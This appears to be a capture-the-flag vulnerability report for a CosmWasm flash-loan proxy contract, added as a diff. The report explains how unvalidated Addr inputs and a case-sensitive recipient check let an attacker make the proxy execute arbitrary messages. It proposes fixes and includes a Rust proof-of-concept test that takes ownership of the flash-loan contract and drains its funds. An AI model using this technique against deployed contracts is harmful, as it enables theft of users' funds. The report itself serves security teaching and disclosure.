@@ -1,0 +1,101 @@
+Issue:
+I am not such the cosmwasm expert. I have more experience with the cosmos go sdk, (and substrate as far as rust stuff goes).
+So I had to RTFM a little about how contract state is handled in cosmwasm, because I saw that addresses are being deserialized from
+the Addr type rather than an Option<String>, *even though the attacker can pass an arbitrary input*. This seemed potentially unsafe to me.
+Sure enough, I came across this info:
+https://book.cosmwasm.com/basics/state.html
+"First, we need to transform the vector of strings into the vector of addresses to be stored. We cannot take addresses as a message argument because not every string is a valid address.
+
+Every string can be technically considered an address. However, not every string is an actual existing blockchain address. When we keep anything of type Addr in the contract, we assume i
+
+addr_validate is not used, and Addr is consumed as an argument.
+I observed this in contract.rs of the proxy contract; this is the function that users call to request a flash loan:
+/// Entry point for user to request flash loan
+pub fn request_flash_loan(
+    deps: DepsMut,
+    env: Env,
+    _info: MessageInfo,
+    recipient: Addr,
+    msg: Binary,
+)
+
+indeed recipient is passed in as an Addr, but it's not validated to be an address! There is only some cursory sanity checking done to
+(attempt to) check that the "recipient" parameter is not the flash loan contract:
+    // Disallow calling flash loan addr
+    if recipient == config.flash_loan_addr {
+        return Err(ContractError::CallToFlashLoan {});
+    }
+However, it's only checking that these two strings are equivalent! I recalled as well that cosmos addresses *are not case sensitive*.
+Cosmos use Bech32. So the simplest way to bypass this minimal check is by simply using an uppercase string.
+see also https://github.com/CosmWasm/cosmwasm/issues/1669
+
+Secondly, I observed that the attacker also has control of the msg parameter. This is used to execute a msg of the "recipient" in the context of
+the proxy contract:
+    msgs.push(CosmosMsg::Wasm(WasmMsg::Execute {
+        contract_addr: recipient.to_string(),
+        msg,
+        funds: vec![flash_loan_balance],
+    }));
+
+So we can execute an arbitrary message of an arbitrary contract, yes including the flash loan contract. So we just change its ownership to
+be the "mock_arb" contract (unpriv user) and then call the withdraw_funds to drain the funds (ie capture the flag :P)
+
+
+Fix:
+The proxy contract and all other contracts should use an Option<String> as a function argument, instead of passing Addr directly.
+And then the type should be validated in the function with something like:
+let recipientaddr = msg.addr.map(|recipient| deps.api.addr_validate(&recipient)).transpose()?;
+
+Additionally, for improved safety, I think that request_flash_loan() should not permit users to pass in an arbitrary message. Instead,
+you could have a standard interface that all flashloan receivers are expected to implement (just thinking of how Balancer or Aave does it)
+
+Also, it would probably be safer if the flashloan receiver were also the info.sender, although this limits composability.
+
+
+PoC test:
+pub const CONTRACT2: &str = "contract2";
+    #[test]
+    fn exploit() {
+        let (mut app, proxy_contract, flash_loan_contract, _mock_arb_contract) =
+            proper_instantiate();
+
+        // prepare transfer ownership message
+        let pwn_msg = to_binary(&FlashLoanExecuteMsg::TransferOwner {
+            new_owner: Addr::unchecked(CONTRACT2),
+        })
+        .unwrap();
+
+        // evade the minimal sanity checking in proxy.rs
+        // (cosmos addresses aren't case-sensitive)
+        let wat: &str = r#"CONTRACT0"#;
+
+        // direct control flow to flashloan contract instead of arb contract
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            proxy_contract,
+            &ExecuteMsg::RequestFlashLoan {
+                recipient: Addr::unchecked(wat),
+                msg: pwn_msg,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // drain funds
+        app.execute_contract(
+            Addr::unchecked(CONTRACT2),
+            flash_loan_contract.clone(),
+            &FlashLoanExecuteMsg::WithdrawFunds {
+                recipient: Addr::unchecked(CONTRACT2),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // funds are drained, flash contract rekt
+        let balance = app
+            .wrap()
+            .query_balance(CONTRACT2, DENOM)
+            .unwrap();
+        assert_eq!(balance.amount, Uint128::new(10_000));
+    }
